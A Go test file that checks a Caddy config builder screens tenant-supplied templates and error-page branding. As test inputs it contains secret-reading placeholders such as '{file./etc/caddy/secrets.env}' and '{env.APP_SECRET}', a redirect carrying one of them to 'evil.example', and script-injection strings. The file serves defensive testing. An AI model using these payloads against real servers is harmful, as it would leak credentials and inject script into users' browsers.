package caddyapi

import (
	"encoding/json"
	"strings"
	"testing"
)

// HPG-001: static_response bodies and Location headers are expanded by Caddy's
// replacer, so a tenant string must not be able to name a provider that reads
// the node's disk, environment or process state.
func TestScreenTenantTemplateAllowList(t *testing.T) {
	for _, bad := range []string{
		"https://x/{file./etc/caddy/secrets.env}",
		"{env.APP_SECRET}",
		"pre-{ENV.APP_SECRET}-post",
		"{system.hostname}",
		"{$APP_SECRET}",
		"{http.vars.anything}",
		"{http.error.status_code}",
		"{http.request.}",
		"{}",
	} {
		if err := ScreenTenantTemplate(bad); err == nil {
			t.Errorf("ScreenTenantTemplate(%q) = nil, want rejection", bad)
		}
	}
	for _, ok := range []string{
		"", "https://example.com/login",
		"https://{http.request.host}{http.request.uri}",
		"/app{http.request.uri.path}",
		"{http.request.header.X-Forwarded-For}",
		"{http.request.remote.host}",
		`literal \{env.APP_SECRET} stays escaped`,
		"unterminated { brace",
	} {
		if err := ScreenTenantTemplate(ok); err != nil {
			t.Errorf("ScreenTenantTemplate(%q) = %v, want nil", ok, err)
		}
	}
}

// A custom error page is HTML: its CSS braces are literal text and must survive,
// while a provider placeholder must come out inert.
func TestNeutralizeTenantTemplate(t *testing.T) {
	in := `<style>body{margin:0}</style><p>{env.APP_SECRET}</p>{http.request.host}`
	out := NeutralizeTenantTemplate(in)
	if !strings.Contains(out, `\{env.APP_SECRET}`) {
		t.Errorf("provider placeholder not neutralized: %s", out)
	}
	if !strings.Contains(out, `\{margin:0}`) {
		t.Errorf("CSS brace must be escaped, not dropped: %s", out)
	}
	if !strings.Contains(out, `{http.request.host}`) || strings.Contains(out, `\{http.request.host}`) {
		t.Errorf("allow-listed placeholder must stay live: %s", out)
	}
	if got := NeutralizeTenantTemplate("no braces here"); got != "no braces here" {
		t.Errorf("plain text changed: %q", got)
	}
}

// A stored redirect naming a file provider must quarantine the route, not be
// published: the response would otherwise echo the file back to the caller.
func TestBuildRouteQuarantinesUnsafeRedirect(t *testing.T) {
	r := Route{
		ID: "91", Hosts: []string{"q.example.com"}, Kind: "redirect",
		RedirectURL: "https://evil.example/{file./etc/caddy/secrets.env}",
	}
	s := mustJSON(r)
	if strings.Contains(s, "{file.") {
		t.Errorf("file provider reached the emitted config\nfull: %s", s)
	}
	if !strings.Contains(s, `"X-Hpg-Quarantine":["placeholder"]`) {
		t.Errorf("unsafe redirect must be quarantined\nfull: %s", s)
	}
	// The same URL without the provider still publishes.
	ok := r
	ok.RedirectURL = "https://example.com/{http.request.uri}"
	if s := mustJSON(ok); !strings.Contains(s, `"Location"`) {
		t.Errorf("allow-listed redirect must still emit\nfull: %s", s)
	}
}

// Every other tenant string that ends up in a replacer-expanded position.
func TestTenantTemplateQuarantineCoversAllSinks(t *testing.T) {
	leak := "{file./etc/caddy/secrets.env}"
	for name, r := range map[string]Route{
		"geo redirect":     {GeoRedirectURL: leak},
		"custom header":    {Headers: map[string]string{"X-Leak": leak}},
		"header name":      {Headers: map[string]string{leak: "v"}},
		"host header":      {UpstreamHostHeader: leak},
		"location rewrite": {LocationRules: []LocationRule{{Path: "/a", RewriteURI: leak}}},
		"location redirect": {LocationRules: []LocationRule{{Path: "/a", Action: "redirect",
			RedirectURL: leak}}},
		"rate key": {RateLimitKey: leak},
	} {
		if TenantTemplateQuarantine(r) == "" {
			t.Errorf("%s: unsafe placeholder was not quarantined", name)
		}
	}
	if reason := TenantTemplateQuarantine(Route{
		RedirectURL: "https://{http.request.host}/x",
		Headers:     map[string]string{"X-Fwd": "{http.request.scheme}"},
	}); reason != "" {
		t.Errorf("allow-listed placeholders must pass: %s", reason)
	}
}

// The maintenance page is a static_response body: a tenant's own HTML goes
// through the replacer too.
func TestMaintenanceBodyNeutralizesTenantHTML(t *testing.T) {
	r := Route{
		ID: "92", Hosts: []string{"m.example.com"}, MaintenanceMode: true,
		CustomErrorOverride: true,
		CustomErrorHTML:     `<style>b{color:red}</style>{file./etc/hostname}`,
	}
	s := mustJSON(r)
	if strings.Contains(s, `{file.`) && !strings.Contains(s, `\\{file.`) {
		t.Errorf("file provider left live in the maintenance body\nfull: %s", s)
	}
	// And the branded fallback path: the operator message is tenant text too.
	m := Route{ID: "93", Hosts: []string{"m2.example.com"}, MaintenanceMode: true,
		MaintenanceMessage: "back soon {env.APP_SECRET}"}
	if s := mustJSON(m); strings.Contains(s, `{env.`) && !strings.Contains(s, `\\{env.`) {
		t.Errorf("file provider left live in the branded body\nfull: %s", s)
	}
}

// Branding is spliced into the page's <style> block and into href/src, neither
// of which html-escaping alone makes safe.
func TestErrorPageBrandingIsNotAnInjectionPoint(t *testing.T) {
	page := renderErrorPage(503, "t", "m", ErrorBranding{
		BgColor:  "#000;}</style><script>alert(1)</script><style>{",
		LogoLink: "javascript:alert(1)",
		Brand:    "acme",
	})
	if strings.Contains(page, "<script>") {
		t.Errorf("background colour escaped the style block:\n%s", page)
	}
	if strings.Contains(page, "javascript:") {
		t.Errorf("logo link kept a script URL:\n%s", page)
	}
	if ok := renderErrorPage(503, "t", "m", ErrorBranding{BgColor: "rgb(10, 20, 30)"}); !strings.Contains(ok, "rgb(10, 20, 30)") {
		t.Error("a legitimate CSS colour must survive")
	}
}

// HPG-006: the rewrite that turns the auth SUBREQUEST into a GET must live
// inside the verifier's reverse_proxy. A standalone rewrite handler changes the
// method of the real request, so the backend sees a GET for every POST.
func TestForwardAuthKeepsDownstreamMethod(t *testing.T) {
	for name, r := range map[string]Route{
		"portal": {ID: "94", Hosts: []string{"p.example.com"}, UpstreamIP: "10.0.0.9",
			UpstreamPort: 8080, PortalProtect: true, PortalDial: "app:8080"},
		"external sso": {ID: "95", Hosts: []string{"s.example.com"}, UpstreamIP: "10.0.0.9",
			UpstreamPort: 8080, SSOProviderURL: "https://idp.example.com", SSOStrictMode: true},
	} {
		var doc any
		if err := json.Unmarshal([]byte(mustJSON(r)), &doc); err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if h := findMethodRewriteHandler(doc); h != "" {
			t.Errorf("%s: standalone rewrite changes the real request method: %s", name, h)
		}
		if !strings.Contains(mustJSON(r), `"rewrite":{"method":"GET"`) {
			t.Errorf("%s: verifier proxy must carry the rewrite itself\nfull: %s", name, mustJSON(r))
		}
	}
}

// findMethodRewriteHandler returns the first `{"handler":"rewrite","method":...}`
// object in the emitted tree - the shape that rewrites the REAL request.
func findMethodRewriteHandler(v any) string {
	switch t := v.(type) {
	case map[string]any:
		if t["handler"] == "rewrite" && t["method"] != nil {
			b, _ := json.Marshal(t)
			return string(b)
		}
		for _, vv := range t {
			if got := findMethodRewriteHandler(vv); got != "" {
				return got
			}
		}
	case []any:
		for _, vv := range t {
			if got := findMethodRewriteHandler(vv); got != "" {
				return got
			}
		}
	}
	return ""
}
